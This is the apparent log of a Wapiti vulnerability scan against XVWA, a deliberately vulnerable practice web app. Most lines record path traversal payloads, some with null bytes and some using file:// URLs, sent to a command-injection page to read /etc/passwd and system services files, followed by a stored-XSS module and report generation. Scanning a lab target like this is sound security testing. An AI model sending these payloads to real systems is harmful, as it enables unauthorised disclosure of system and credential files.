2024-03-20 15:25:17.187 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 15:25:17.203 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 15:25:17.218 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 15:25:17.232 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:17.245 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:17.262 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 15:25:17.278 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 15:25:17.296 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:17.311 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:17.332 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=file%3A%2F%2F%2Fetc%2Fpasswd (0)
2024-03-20 15:25:17.351 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-20 15:25:17.366 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
2024-03-20 15:25:17.381 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
2024-03-20 15:25:17.405 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
2024-03-20 15:25:17.424 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:17.441 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 15:25:17.454 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/cmdi/?target=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:17.480 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=default (1)
2024-03-20 15:25:17.488 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/ (1)
2024-03-20 15:25:17.518 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
2024-03-20 15:25:17.528 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=fuzz (0)
2024-03-20 15:25:17.561 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/?target=default (1)
2024-03-20 15:25:17.600 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/cmdi/ (1)
2024-03-20 15:25:17.687 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
2024-03-20 15:25:17.709 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//rce.json/
2024-03-20 15:25:17.709 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//rce.json/web_03202024_1525.html with a browser to see this report.
